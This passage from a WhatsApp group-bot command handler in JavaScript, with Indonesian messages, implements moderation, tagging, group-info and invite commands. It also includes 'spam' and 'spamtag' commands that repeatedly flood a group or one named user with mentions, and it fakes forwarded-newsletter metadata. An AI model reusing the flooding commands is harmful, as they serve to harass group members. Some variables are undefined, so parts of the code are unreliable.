            let db = isKick ? AntiLinkKick : antilinkGroups;
            let dbFile = isKick ? './engine/Storage/antilink2.json' : './engine/Storage/antilink.json';
        
            if (args[0] === "on") {
                if (db.includes(m.chat)) return reply(`✅ ${command} sudah aktif!`);
                db.push(m.chat);
                fs.writeFileSync(dbFile, JSON.stringify(db));
                reply(`✅ ${command} telah diaktifkan!`);
            } else if (args[0] === "off") {
                if (!db.includes(m.chat)) return reply(`❌ ${command} belum diaktifkan.`);
                db.splice(db.indexOf(m.chat), 1);
                fs.writeFileSync(dbFile, JSON.stringify(db));
                reply(`❌ ${command} telah dinonaktifkan!`);
            } else {
                reply(`⚠️ Gunakan:\n- *.${command} on* untuk mengaktifkan\n- *.${command} off* untuk menonaktifkan`);
            }
        }
        break;
        //═══════════════════════════════════//
        case "antilinkall": {
            if (!isGroup) return;
            if (!isAdmins) return;
            if (!isBotAdmins) return;
        
            if (args[0] === "on") {
                if (AntiLinkAll.includes(m.chat)) return reply("✅ AntiLinkAll sudah aktif!");
                AntiLinkAll.push(m.chat);
                fs.writeFileSync('./engine/Storage/antilinkall.json', JSON.stringify(AntiLinkAll));
                var groupe = await sock.groupMetadata(from)
                var members = groupe['participants']
                var mems = []
                members.map(async adm => {
                mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
                })
                await sleep(3000)
                sock.sendMessage(from, { 
                    text: `\`\`\`「 ⚠️ Warning ⚠️ 」\`\`\`\n\nJika Anda Bukan *ADMIN*, Jangan Kirim Link Apapun Di Grup Ini Atau Kamu Akan Langsung *Ditendang!*`,
                    contextInfo: {
                        isForwarded: true, 
                        mentionedJid: mems, 
                          forwardedNewsletterMessageInfo: {
                              newsletterJid: global.idSaluran,
                              newsletterName: global.namaSaluran 
                          }, 
                          externalAdReply: {
                          title: `${global.dev} - Assistant`,
                          body: `📍 Paju-si, South Korea`,
                          thumbnailUrl: global.thumb,
                          sourceUrl: global.linkSaluran,     
                            mediaType: 1,
                            renderLargerThumbnail: false,
                        },
                    }
                }, { quoted : m })
            } else if (args[0] === "off") {
                if (!AntiLinkAll.includes(m.chat)) return reply("❌ AntiLinkAll belum diaktifkan.");
                AntiLinkAll = AntiLinkAll.filter(group => group !== m.chat);
                fs.writeFileSync('./engine/Storage/antilinkall.json', JSON.stringify(AntiLinkAll));
                reply("❌ AntiLinkAll telah dinonaktifkan!");
            } else {
                reply("⚠️ Gunakan:\n- *.antilinkall on* untuk mengaktifkan\n- *.antilinkall off* untuk menonaktifkan");
            }
        }
        break;
        //══════════════════════════════════//
        case 'antitagsw': {
            if (!groupAdmins) return reply("Hanya admin yang bisa mengatur fitur ini.");
            if (!isGroup) return
        
            const toggle = text?.toLowerCase();
            if (!['on', 'off'].includes(toggle)) {
                return reply(`Gunakan: ${prefix}antisw on/off`);
            }
        
            antiSW[m.chat] = toggle === 'on';
            saveAntiSW();
        
            reply(`✅ Fitur anti tag SW berhasil *${toggle === 'on' ? 'diaktifkan' : 'dinonaktifkan'}* untuk grup ini.`);
          }
          break;
        //═══════════════════════════════════//
        //AFK USER
        case 'afk': {
            addAfk(m.sender, text || '');
        
            await sock.sendMessage(m.chat, {
                text: `🌙 @${m.sender.split("@")[0]} telah masuk mode AFK${text ? `: ${text}` : ''}`,
                contextInfo: {
                    mentionedJid: [m.sender],
                    forwardingScore: 99999,
                    isForwarded: true,
                    forwardedNewsletterMessageInfo: {
                        newsletterName: global.namaSaluran,
                        newsletterJid: global.idSaluran,
                    },
                }
            }, { quoted: m });
        }
        break;
        //══════════════════════════════════//
        //ADD MEMBER
        case 'addmem': {
            if (!isGroup) return;
            if (!isOwner) return;
            if (!isBotAdmins) return reply("❌ Bot harus menjadi admin untuk menambahkan anggota!");
            if (!isOwner) return reply(msg.owner)
        
            let user = args[0];
            if (!user) return reply(`⚠️ Contoh: *${prefix}addmem 62812xxxx*`);
        
            user = user.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        
            try {
                await sock.groupParticipantsUpdate(m.chat, [user], "add");
                await sock.sendMessage(m.chat, {
                    image: { url: global.thumb },
                    caption: `✅ Berhasil menambahkan @${user.split("@")[0]}`, 
                    contextInfo: {
                        isForwarded: true, 
                        mentionedJid: [user], 
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: global.idSaluran,
                            newsletterName: global.namaSaluran 
                        },
                    }
                }, { quoted : m })
                
            } catch (e) {
                reply("❌ Gagal menambahkan anggota. Pastikan nomor benar & tidak diblokir.");
            }
        }
        break;
        //════════════════════════════════════//
        //Kick Case
        case "kik": case "kick":
        case "dor": {
            if (!isGroup) return reply(msg.group)
            if (!isAdmins) return reply(msg.admin)
            if (!isBotAdmins) return reply("❌ Bot harus admin!")
          
            let users = []
            if (m.mentionedJid.length) users = m.mentionedJid
            else if (m.quoted) users = [m.quoted.sender]
            else if (text) {
              users = text.split(/[\s,]+/)
                .map(v => v.replace(/[^0-9]/g, '') + "@s.whatsapp.net")
            } else {
              return reply(`⚠️ Tag / reply / tulis nomor yang ingin di-kick!`)
            }
          
            let metadata = await sock.groupMetadata(m.chat)
            let admins = metadata.participants
              .filter(v => v.admin)
              .map(v => v.id)
          
            users = users.filter(u =>
              u !== sock.user.jid &&
              !admins.includes(u)
            )
          
            for (let u of users) {
              await sock.groupParticipantsUpdate(m.chat, [u], 'remove')
            }
            await sock.sendMessage(m.chat, {
                text: `✅ Berhasil mengeluarkan ${users.length} Hama Di Group ini🥵`, 
                contextInfo: {
                isForwarded: true, 
                mentionedJid: member, 
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: global.idSaluran,
                        newsletterName: global.namaSaluran 
                    }, 
                    externalAdReply: {
                        title: `${global.dev} — Assistant`,
                        body: `📍 Paju-si, South Korea`,
                        thumbnailUrl: global.thumb,
                        sourceUrl: global.linkSaluran,     
                        mediaType: 1,
                        renderLargerThumbnail: false,
                    },
                }
            }, { quoted : m })
        }
        break
        //═══════════════════════════════════//
        case "leave": case 'outgc': {
            if (!isOwner) return
            if (!isGroup) return reply(msg.group)
            await reaction(m.chat, "😭")
            await sleep(2000)
            await reply("Sukses, Bot akan di proses keluar dari group.\n See Youu...")
            await sleep(4000)
            await sock.groupLeave(m.chat)
        }
        break
        //═══════════════════════════════════//
        case "pingc":
        case "pinchat": {
            if (!m.isGroup) return reply("Fitur ini hanya bisa dipakai di grup.")
            if (!isOwner) return;
            if (!text) {
                return reply(`Contoh:\n${prefix+command} 24jam\n${prefix+command} 7hari\n${prefix+command} 30hari`)
            }
        
            let duration
        
            if (text.toLowerCase() === "24jam") {
                duration = 86400 // 24 jam
            } else if (text.toLowerCase() === "7hari") {
                duration = 604800 // 7 hari
            } else if (text.toLowerCase() === "30hari") {
                duration = 2592000 // 30 hari
            } else {
                return reply("Pilihan hanya: 24jam, 7hari, 30hari")
            }
        
            try {
                await sock.chatModify(
                    { pin: duration },
                    m.chat
                )
        
                reply(`Chat berhasil dipin selama ${text}. 📌`)
            } catch (e) {
                reply("Gagal pin chat. Pastikan bot admin dan fitur didukung.")
            }
        }
        break
        //═══════════════════════════════════//
        case "unpinchat": {
            if (!m.isGroup) return reply("Hanya di grup.")
            if (!isOwner) return;
        
            try {
                await sock.chatModify({ pin: 0 }, m.chat)
                reply("Chat berhasil di-unpin.")
            } catch {
                reply("Gagal unpin chat.")
            }
        }
        break
        //═══════════════════════════════════//
        case 'getpp': {
            try {
                let target;
        
                // Jika reply pesan
                if (m.quoted) {
                    target = m.quoted.sender;
                }
                // Jika mention/tag
                else if (m.mentionedJid && m.mentionedJid.length > 0) {
                    target = m.mentionedJid[0];
                }
                // Jika input nomor
                else if (text) {
                    let nomor = text.replace(/[^0-9]/g, '');
                    if (!nomor.startsWith('0') && !nomor.startsWith('62')) {
                        return reply('Masukkan nomor yang valid!');
                    }
                    if (nomor.startsWith('0')) {
                        nomor = '62' + nomor.slice(1);
                    }
                    target = nomor + '@s.whatsapp.net';
                }
                // Default ke pengirim
                else {
                    target = m.sender;
                }
        
                await reaction(m.chat, "🖼️")
                await sleep(1000)
        
                // Mengambil URL foto profil
                let ppUrl;
                try {
                    ppUrl = await sock.profilePictureUrl(target, 'image');
                } catch {
                    ppUrl = 'https://telegra.ph/file/24fa902ead26340f3df2c.png';
                }
        
                // Mengirim foto profil
                await sock.sendMessage(m.chat, {
                    image: { url: ppUrl },
                    caption: `📸 Foto Profil\n\n👤 @${target.split('@')[0]}`,
                    mentions: [target]
                }, { quoted: m });
        
            } catch (err) {
                console.error(err);
                reply('Terjadi kesalahan saat mengambil foto profil.');
            }
        }
        break;
        //═════════════════════════════════//
        case "joingc": {
            if (!isOwner) return 
            if (!text) return reply("💬 *Sertakan Link Group*");
            if (!text.includes("chat.whatsapp.com")) return reply("Link tautan tidak valid");
            let result = text.split('https://chat.whatsapp.com/')[1];
            try {
                let id = await sock.groupAcceptInvite(result);
                const groupMetadata = await sock.groupMetadata(id);
                const groupInfo = {
                    groupName: groupMetadata.subject,
                    groupId: groupMetadata.id,
                    groupCreator: groupMetadata.owner,
                    groupCreationDate: new Date(groupMetadata.creation * 1000).toLocaleString(),
                    groupStatus: groupMetadata.announce === 'false' ? 'Terbuka' : 'Tertutup',
                };
                const groupInfoMessage = 
`*Successfully Joined The Group!*
❏━━═┅═━━━═┅═━━━═┅═━━━๑
┣✦ Nama Grup:\n\`${groupInfo.groupName}\`
┣✦ ID Grup:\n\`${groupInfo.groupId}\`
┣✦ Pembuat Grup:\n\`${groupInfo.groupCreator}\`
┣✦ Tanggal Dibuat:\n\`${groupInfo.groupCreationDate}\`
┣✦ Status Grup:\n\`${groupInfo.groupStatus}\`
┗━═┅═━━━═┅═━━━═┅═━━━๑
    
`;
                  
                reply(groupInfoMessage);
            } catch (error) {
              reply("Terjadi kesalahan saat mencoba bergabung ke grup.");
            }
        }
        break
        //═════════════════════════════//
        case "spam": {
            if (!isOwner) return;
            if (!m.isGroup) return reply("Fitur ini hanya untuk grup")
            if (!m.quoted) return reply(`Reply pesan yang ingin dispam\nContoh ${prefix + command} 10`)
            if (!text) return reply(`Contoh : ${prefix + command} 10`)
        
            const sleep = ms => new Promise(resolve => setTimeout(resolve, ms))
        
            let jumlah = parseInt(text)
            if (isNaN(jumlah)) return reply("Masukkan angka")
            if (jumlah > 20) return reply("Max spam 20")
        
            let groupMetadata = await sock.groupMetadata(m.chat)
            let member = groupMetadata.participants.map(e => e.id)
        
            let quoted = m.quoted
            let mime = (quoted.msg || quoted).mimetype || ""
        
            await reaction(m.chat, "🚀")
        
            for (let i = 0; i < jumlah; i++) {
                try {
                    if (/sticker/.test(mime)) {
                        let media = await quoted.download()
                        await sock.sendMessage(m.chat, {
                            sticker: media,
                            mentions: member
                        })
                    } else if (/image/.test(mime)) {
                        let media = await quoted.download()
                        await sock.sendMessage(m.chat, {
                            image: media,
                            caption: quoted.caption || "",
                            mentions: member
                        })
                    } else if (/video/.test(mime)) {
                        let media = await quoted.download()
                        await sock.sendMessage(m.chat, {
                            video: media,
                            caption: quoted.caption || "",
                            mentions: member
                        })
                    } else {
                        await sock.sendMessage(m.chat, {
                            text: quoted.text || "Spam 😈",
                            mentions: member
                        })
                    }
        
                    await sleep(1500)
                } catch (e) {
                    console.log("Error spam:", e)
                }
            }
        
            await reaction(m.chat, "✅")
        }
        break
        //═══════════════════════════════════//
        case "spamtag": case "tag": {
            if (!isOwner) return;
            if (!text) return reply(`Format salah!\nContoh:\n.tag @628xxx|10|Halo bang!`)
        
            let [target, jumlah, pesan] = text.split("|")
        
            if (!target || !jumlah || !pesan) {
                return reply(`Format harus: ${prefix+command} @user|jumlah|pesan`)
            }
        
            jumlah = parseInt(jumlah)
            if (isNaN(jumlah)) return reply("Jumlah harus angka!")
        
            let jid = m.mentionedJid[0] 
                ? m.mentionedJid[0] 
                : m.quoted 
                ? m.quoted.sender 
                : target.replace(/[^0-9]/g, '') + "@s.whatsapp.net"
        
            for (let i = 0; i < jumlah; i++) {
                await sock.sendMessage(m.chat, {
                    text: `@${jid.split("@")[0]} ${pesan}`,
                    mentions: [jid]
                })
        
                await new Promise(res => setTimeout(res, 1000)) // delay biar aman
            }
        }
        break
        //═══════════════════════════════════//
        case 'tagall':{
            if (!isGroup) return reply(msg.group);
            if (!isOwner) return reply(msg.owner); 
            const textMessage = args.join(" ") || "Takde pesannya wei";
            let teks = `tagall message :\n> *${textMessage}*\n\n`;
            const groupMetadata = await sock.groupMetadata(m.chat);
            const participants = groupMetadata.participants;
            for (let mem of participants) {
                teks += `@${mem.id.split("@")[0]}\n`;
            }
            sock.sendMessage(m.chat, {
            text: teks,
            mentions: participants.map((a) => a.id)
            }, { quoted: m });
        }
        break
        //════════════════════════════════//
        //Hidetag Case
        case "h":
        case "ht":
        case "hidetag": {
            if (!isOwner) return
            if (!isGroup) return
        
            let members = participants
                .map(v => v.id)
                .filter(v => v !== sock.user.jid)
        
            let text = m.text?.replace(/^\.h(idetag|t)?\s?/i, "").trim()
        
            // =============================
            // 🔹 MODE 1: REPLY PESAN
            // =============================
            if (m.quoted) {
                let q = m.quoted
                let type = q.mtype
        
                // TEXT
                if (type === "conversation" || type === "extendedTextMessage") {
                    return sock.sendMessage(m.chat, {
                        text: q.text || "",
                        mentions: members
                    }, { quoted: m })
        
                // IMAGE
                } else if (type === "imageMessage") {
                    let buffer = await q.download()
                    return sock.sendMessage(m.chat, {
                        image: buffer,
                        caption: q.caption || "",
                        mentions: members
                    }, { quoted: m })
        
                // VIDEO
                } else if (type === "videoMessage") {
                    let buffer = await q.download()
                    return sock.sendMessage(m.chat, {
                        video: buffer,
                        caption: q.caption || "",
                        mentions: members
                    }, { quoted: m })
        
                // AUDIO
                } else if (type === "audioMessage") {
                    let buffer = await q.download()
                    return sock.sendMessage(m.chat, {
                        audio: buffer,
                        mimetype: q.mimetype,
                        ptt: q.ptt || false,
                        mentions: members
                    }, { quoted: m })
        
                // STICKER
                } else if (type === "stickerMessage") {
                    let buffer = await q.download()
                    return sock.sendMessage(m.chat, {
                        sticker: buffer,
                        mentions: members
                    }, { quoted: m })
        
                // DOCUMENT
                } else if (type === "documentMessage") {
                    let buffer = await q.download()
                    return sock.sendMessage(m.chat, {
                        document: buffer,
                        mimetype: q.mimetype || 'application/octet-stream',
                        fileName: q.fileName || 'file',
                        caption: q.caption || '',
                        mentions: members
                    }, { quoted: m })
        
                } else {
                    return reply("❌ Media tidak didukung untuk hidetag")
                }
            }
        
            // =============================
            // 🔹 MODE 2: TEXT BIASA (.ht teks)
            // =============================
            if (text) {
                return sock.sendMessage(m.chat, {
                    text,
                    mentions: members
                }, { quoted: m })
            }
        
            // =============================
            // ❌ GAGAL
            // =============================
            return reply("❌ Gunakan dengan reply pesan atau ketik `.ht teksnya`")
        }
        break
        //════════════════════════════════//
        case "totag": case 'liat': case 'tingali': case 'delok': {
            if (!isGroup) return;
            if (!isOwner) return;
            if (!m.quoted) return reply("Reply pesan yang mau di tag!")
        
            let members = participants
                .map(v => v.id)
                .filter(v => v !== sock.user.jid)
        
            let q = m.quoted
            let type = q.mtype
        
            let options = {
                mentions: members,
                quoted: m
            }
        
            // TEXT
            if (type === "conversation" || type === "extendedTextMessage") {
                await sock.sendMessage(m.chat, {
                    text: q.text || "",
                    mentions: members }, 
                    { quoted : m })
        
            // IMAGE
            } else if (type === "imageMessage") {
                let buffer = await q.download()
                await sock.sendMessage(m.chat, {
                    image: buffer,
                    caption: q.caption || "",
                    mentions: members }, 
                    { quoted : m })
        
            // VIDEO
            } else if (type === "videoMessage") {
                let buffer = await q.download()
                await sock.sendMessage(m.chat, {
                    video: buffer,
                    caption: q.caption || "",
                    mentions: members }, 
                    { quoted : m })
        
            // AUDIO
            } else if (type === "audioMessage") {
                let buffer = await q.download()
                await sock.sendMessage(m.chat, {
                    audio: buffer,
                    mimetype: q.mimetype,
                    ptt: q.ptt || false,
                    mentions: members }, 
                    { quoted : m })
        
            // STICKER
            } else if (type === "stickerMessage") {
                let buffer = await q.download()
                await sock.sendMessage(m.chat, {
                    sticker: buffer,
                    mentions: members }, 
                    { quoted : m })
        
            } else if (type === "documentMessage") {
                let buffer = await q.download()
            
                await sock.sendMessage(m.chat, {
                    document: buffer,
                    mimetype: q.mimetype || 'application/octet-stream',
                    fileName: q.fileName || 'file',
                    caption: q.caption || '',
                    mentions: members }, 
                    { quoted : m })
            } else {
                return reply("❌ Media tidak didukung untuk totag")
            }
        }
        break
        //═══════════════════════════════════//
        //CASE OPEN GROUP
        case "open": case "opengc": case "buka": {
            if (!isGroup) return 
            if (!isAdmins) return (msg.admin)
            if (!isBotAdmins) return (msg.adminbot)
            var member = groupMetadata.participants.map(e => e.id);
            await sleep(3000)
            await sock.groupSettingUpdate(m.chat, 'not_announcement')
            await sock.sendMessage(m.chat, {
                text: 
`🔓 Yay, Gerbang Grup Terbuka! 🔓

Sekarang semua anggota bebas ngobrol seru lagi di sini. Ayo ramein! 🎉😄`, 
            contextInfo: {
            isForwarded: true, 
            mentionedJid: member, 
                forwardedNewsletterMessageInfo: {
                    newsletterJid: global.idSaluran,
                    newsletterName: global.namaSaluran 
                }, 
                externalAdReply: {
                    title: `${global.dev} — Assistant`,
                    body: `📍 Paju-si, South Korea`,
                    thumbnailUrl: global.thumb,
                    sourceUrl: global.linkSaluran,     
                    mediaType: 1,
                    renderLargerThumbnail: false,
                },
            }
            }, { quoted : m })
        }
        break
        //════════════════════════════════//
        //Close Group
        case "close": case "closegc": case "tutup": {
            if (!isGroup) return
            if (!isAdmins) return (msg.admin)
            if (!isBotAdmins) return (msg.adminbot)
        await sock.groupSettingUpdate(m.chat, 'announcement')
        await sleep(3000)
        await sock.sendMessage(m.chat, {
            text: `
┌─┉─ • ─┉─  ── .✦
│
│*yah.. it's time to closed*
│*nanti dibuka lagi yaa...*
│
└─┉─¡! • !¡─┉─ ── .✦
`, 
            buttons: [{ buttonId: ".", buttonText: { displayText: '⬨ Itss Dric' }, type: 1 }],
            contextInfo: {
            isForwarded: true, 
            mentionedJid: [sender], 
                forwardedNewsletterMessageInfo: {
                    newsletterJid: global.idSaluran,
                    newsletterName: global.namaSaluran 
                }, 
                externalAdReply: {
                    title: `${global.dev} — Assistant`,
                    body: `📍 Paju-si, South Korea`,
                    thumbnailUrl: global.thumb,
                    sourceUrl: global.linkSaluran,
                    mediaType: 1
                }
            }
            }, { quoted : m })
        }
        break
        //═════════════════════════════════//
        case "del": case "delete": case "dul": {
            if (!m.quoted) return reply('⚠️ Reply pesan yang ingin dihapus!')
            if (!isAdmins && m.quoted.sender !== m.sender) return reply('⚠️ Tidak bisa hapus pesan orang lain!')
            try {
                await sock.sendMessage(m.chat, {
                    delete: {
                        remoteJid: m.chat,
                        fromMe: false,
                        id: m.quoted.id,
                        participant: m.quoted.sender
                    }
                })
            } catch {
              reply('❌ Gagal menghapus pesan!')
           }
        }
        break
        //══════════════════════════════════//
        case "demote": case "demot":
        case "promote": case "promot":
        case "comot": {
            if (!m.isGroup) return reply(msg.group)
            if (!isAdmins) return reply(msg.admin)
            if (!isBotAdmins)  return reply(msg.adminbot)
        
            let target =
                m.mentionedJid?.[0] ||
                m.quoted?.sender ||
                (text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : null)
        
            if (!target) return reply(example("@tag / reply pesan"))
        
            let action = /demote|demot/.test(command) ? "demote" : "promote"
        
            await sock.groupParticipantsUpdate(m.chat, [target], action)
        
            await sock.sendMessage(m.chat, {
                text: `✅ Berhasil *${action}* @${target.split("@")[0]}`,
                contextInfo: {
                    mentionedJid: [target],
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: global.idSaluran,
                        newsletterName: global.namaSaluran
                    },
                    externalAdReply: {
                        title: `${global.dev} — Assistant`,
                        body: `📍 Paju-si, South Korea`,
                        thumbnailUrl: global.thumb,
                        sourceUrl: global.linkSaluran,
                        mediaType: 1
                    }
                }
            }, { quoted: m })
        }
        break
        //═══════════════════════════════════//
        case 'linkgroup':
        case 'linkgc':
        case 'linkgrup': {
            if (!isGroup) return;
            if (!isBotAdmins) return reply('❌ Bot harus admin')
            if (!isAdmins) return reply('❌ Admin only')
        
            let code = await sock.groupInviteCode(from)
            let link = `https://chat.whatsapp.com/${code}`
            
            let Msg = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: { "messageContextInfo": { "deviceListMetadata": {}, "deviceListMetadataVersion": 2 },
                        interactiveMessage: {
                            footer: { text: `\nKlik Dibawah ini untuk salin Link Group` },
                            body: { text: `${link}` },
                            contextInfo: {
                                isForwarded: true, 
                                forwardingScore: 250930,
                                forwardedNewsletterMessageInfo: {
                                    newsletterJid: global.idSaluran,
                                    newsletterName: global.namaSaluran,
                                    serverId: 999
                                },
                            },
                            nativeFlowMessage: {
                                buttons: [
                                    {
                                    name: "cta_copy",
                                    buttonParamsJson: JSON.stringify({
                                        display_text: "📋 Copy Link",
                                        copy_code: link
                                    })
                                }
                                ], 
                            },
                        },
                    }, 
                }, 
            },{ quoted : m });
            await sleep(1500)
            await sock.relayMessage( Msg.key.remoteJid, Msg.message,{ messageId: Msg.key.id })
        }
        break
        //═════════════════════════════════//
        case 'resetlinkgc': {
        if (!isGroup) return;
        if (!isOwner) return;
        if (!isAdmins) return reply(msg.admin)
        if (!isBotAdmins) return reply(msg.adminbot)
        
        sock.groupRevokeInvite(from);
        }
        break;
        //═════════════════════════════════//
        case "id": {
            if (!isOwner) return;
            let teks = m.chat
            let Msg = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: { "messageContextInfo": { "deviceListMetadata": {}, "deviceListMetadataVersion": 2 },
                        interactiveMessage: {
                            footer: { text: `\n${global.footer}` },
                            contextInfo: {
                                isForwarded: true, 
                                forwardingScore: 250930,
                                forwardedNewsletterMessageInfo: {
                                    newsletterJid: global.idSaluran,
                                    newsletterName: global.namaSaluran ,
                                    serverId: 999
                                }
                            },
                            body: { text: teks },
                            nativeFlowMessage: {
                                buttons: [
                                    {
                                        name: "cta_copy",
                                        buttonParamsJson: JSON.stringify({
                                            display_text: "📋 Copy ID",
                                            copy_code: teks
                                        })
                                    }
                                ], 
                            },
                        },
                    }, 
                }, 
            },{ quoted : m });
            await sleep(1500)
            await sock.relayMessage( Msg.key.remoteJid, Msg.message,{ messageId: Msg.key.id })
        }
        break
        //═════════════════════════════════//
        case 'infogrup': case 'infogb': case 'infogc': case 'infogroup': {
            if (!m.isGroup) return reply(msg.group)
            if (!isAdmins) return reply(msg.admin)
            if (!isBotAdmins)  return reply(msg.adminbot)
        
            const metadata = await sock.groupMetadata(m.chat)
            const participants = metadata.participants
        
            const admins = participants.filter(v => v.admin).map(v => v.id)
            const owner = metadata.owner || admins[0] || '-'
        
            const totalMember = participants.length
            const totalAdmin = admins.length
        
            // ===== TANGGAL PEMBUATAN & UMUR GRUP =====
            let createdText = '-'
            let umurText = '-'
        
            if (metadata.creation) {
                const createdDate = new Date(metadata.creation * 1000)
                const now = new Date()
        
                const diffTime = Math.abs(now - createdDate)
                const diffDays = Math.floor(diffTime / (1000 * 60 * 60 * 24))
        
                const years = Math.floor(diffDays / 365)
                const months = Math.floor((diffDays % 365) / 30)
                const days = diffDays % 30
        
                createdText = createdDate.toLocaleDateString('id-ID', {
                    day: '2-digit',
                    month: 'long',
                    year: 'numeric'
                })
        
                umurText = `${years} tahun, ${months} bulan, ${days} hari`
            }
        
            // ===== LINK GRUP =====
            let link = 'Tidak tersedia'
            try {
                link = 'https://chat.whatsapp.com/' + await sock.groupInviteCode(m.chat)
            } catch {}
        
            let teks = `📌 *INFORMASI GRUP*
    
📛 *Nama Grup*
${metadata.subject}

*Pembuat Grup*
@${owner.split('@')[0]}

👥 *Jumlah Member*
${totalMember}

🛡️ *Jumlah Admin*
${totalAdmin}

🛡️ *Daftar Admin*
${admins.map(v => `@${v.split('@')[0]}`).join(', ') || '-'}

📅 *Tanggal Dibuat*
${createdText}

⏳ *Umur Grup*
${umurText}

🔗 *Link Grup*
${link}

🆔 *ID Grup*
${metadata.id}

📝 *Deskripsi Grup*
${metadata.desc || '-'}
`
            let Msg = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: { "messageContextInfo": { "deviceListMetadata": {}, "deviceListMetadataVersion": 2 },
                        interactiveMessage: {
                            footer: { text: `\n${global.footer}` },
                            contextInfo: {
                                mentionedJid: [owner, ...admins],
                                isForwarded: true, 
                                forwardingScore: 250930,
                                forwardedNewsletterMessageInfo: {
                                    newsletterJid: global.idSaluran,
                                    newsletterName: global.namaSaluran ,
                                    serverId: 999
                                }
                            },
                            body: { text: teks },
                            nativeFlowMessage: {
                                buttons: [
                                    {
                                            "name": "cta_copy",
                                            "buttonParamsJson": JSON.stringify({
                                            "display_text": "Copy ID Group",
                                            "copy_code": `${metadata.id}`
                                        })
                                    },
                                    {
                                        "name": "cta_copy",
                                        "buttonParamsJson": JSON.stringify({
                                        "display_text": "Copy Link Group",
                                        "copy_code": `${link}`
                                        })
                                    }
                                ], 
                            },
                        },
                    }, 
                }, 
            },{ quoted : m });
            await sleep(1500)
            await sock.relayMessage( Msg.key.remoteJid, Msg.message,{ messageId: Msg.key.id })
            /*await sock.sendMessage(m.chat, {
                text: teks,
                mentions: [owner, ...admins],
                contextInfo: {
                    isForwarded: true, 
                    forwardingScore: 250930,
                    forwardedNewsletterMessageInfo: {
                         newsletterJid: global.idSaluran,
                         newsletterName: global.namaSaluran,
                         serverId: 999
                    }
               },
            }, { quoted: m })*/
        }
        break
        //════════════════════════════════//
        case 'listgc': {
            if (!isOwner) return
        
            // Ambil semua grup yang bot join
            let groups = await sock.groupFetchAllParticipating();
            let groupList = Object.values(groups);
        
            if (!groupList.length) return m.reply("Bot belum join grup apapun!");
        
            // Preview 5 grup pertama biar nggak diem
            let preview = groupList.slice(0, 5).map((g, i) => `${i+1}. ${g.subject}`).join("\n");
            await reaction(m.chat, "⚡")
        
            // Delay biar smooth
            await new Promise(res => setTimeout(res, 800));
        
            // Rows untuk tombol list
            let rows = groupList.map(g => ({
                title: g.subject || "No Name",
                description: "Klik untuk menyalin ID grup",
                id: `.idgc2 ${g.id}` // nanti bikin case copyid
            }));
        
            // Tombol list
            await sock.sendMessage(m.chat, {
                text: "📂 Pilih grup untuk mendapatkan ID Group:",
                buttons: [
                    {
                        buttonId: "select_group",
                        buttonText: { displayText: "LIST GROUP" },
                        type: 4,
                        nativeFlowInfo: {
                            name: "single_select",
                            paramsJson: JSON.stringify({
                                title: "LIST GROUP",
                                sections: [
                                    {
                                        title: "Pilih Grup",
                                        rows: rows
                                    }
                                ]
                            })
                        }
                    }
                ]
            }, { quoted: m });
        }
        break;
        //══════════════════════════════════//
        case 'idgc2': {
            if (!isOwner) return
            if (!text) return reply("ID grup tidak ditemukan!");
        
            let id = text.trim()
        
            // Ambil metadata biar lebih cakep
            let metadata
            try {
                metadata = await sock.groupMetadata(id)
            } catch {
                return m.reply("Gagal mengambil data grup. ID mungkin tidak valid.")
            }
        
            let groupName = metadata.subject || "Unknown Group"
        
            let Msg = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: { "messageContextInfo": { "deviceListMetadata": {}, "deviceListMetadataVersion": 2 },
                        interactiveMessage: {
                            footer: { text: `\n${global.footer}` },
                            contextInfo: {
                                mentionedJid: [m.sender], 
                                isForwarded: true, 
                                forwardingScore: 250930,
                                forwardedNewsletterMessageInfo: {
                                    newsletterJid: global.idSaluran,
                                    newsletterName: global.namaSaluran ,
                                    serverId: 999
                                }
                            },
                            body: { text: `📌 *INFO GRUP*\n\n` +
                      `📛 Nama: ${groupName}\n` +
                      `🆔 ID: ${id}` },
                            nativeFlowMessage: {
                                buttons: [
                                    {
                                            "name": "cta_copy",
                                            "buttonParamsJson": JSON.stringify({
                                            "display_text": "Copy ID Group",
                                            "copy_code": `${id}`
                                        })
                                    }
                                ], 
                            },
                        },
                    }, 
                }, 
            },{ quoted : m });
            await sleep(1500)
            await sock.relayMessage( Msg.key.remoteJid, Msg.message,{ messageId: Msg.key.id })
        }
        break;
        //═══════════════════════════════════//
        case "listgc2": case"listgrup2": {
            if (!isOwner) return reply(msg.owner)
            let gcall = Object.values(await sock.groupFetchAllParticipating().catch(_=> null))
            let listgc = '\n'
            gcall.forEach((u, i) => {
            listgc += `${i+1}. *${u.subject}*\n> *ID:* ${u.id}\n> *Total Member:* ${u.participants.length} Member\n> *Status Grup:* ${u.announce == true ? "Tertutup" : "Terbuka"}\n> *Pembuat :* ${u.owner ? u.owner.split('@')[0] : 'Sudah keluar'}\n\n`
            })
            await sock.sendMessage(m.chat, {
                text: listgc
            }, { quoted: m });
        }
        break
        //═══════════════════════════════════//
        case "idgc": case "cekidgc": case 'idgrup':
        case 'idgroup': {
            if (!isGroup) return 
            if (!text) return m.reply(`Contoh:\n${prefix+command} https://chat.whatsapp.com/XXXX`);

            try {
            
                let link = text.trim()
                if (!link.includes("chat.whatsapp.com")) {
                return m.reply("❌ Link grup tidak valid")
                }
                
                let code = link.split("https://chat.whatsapp.com/")[1]
                let res = await sock.groupGetInviteInfo(code)
                
                let groupId = res.id
                let tekanya = `🔍 *CEK ID GROUP*

📌 Nama : ${res.subject}
🆔 ID : ${groupId}
👥 Member : ${res.size}`

                let Msg = generateWAMessageFromContent(m.chat, {
                    viewOnceMessage: {
                        message: { "messageContextInfo": { "deviceListMetadata": {}, "deviceListMetadataVersion": 2 },
                            interactiveMessage: {
                                footer: { text: `\n${global.footer}` },
                                contextInfo: {
                                    mentionedJid: [m.sender], 
                                    isForwarded: true, 
                                    forwardingScore: 250930,
                                    forwardedNewsletterMessageInfo: {
                                        newsletterJid: global.idSaluran,
                                        newsletterName: global.namaSaluran ,
                                        serverId: 999
                                    }
                                },
                                body: { text: teksnya },
                                nativeFlowMessage: {
                                    buttons: [
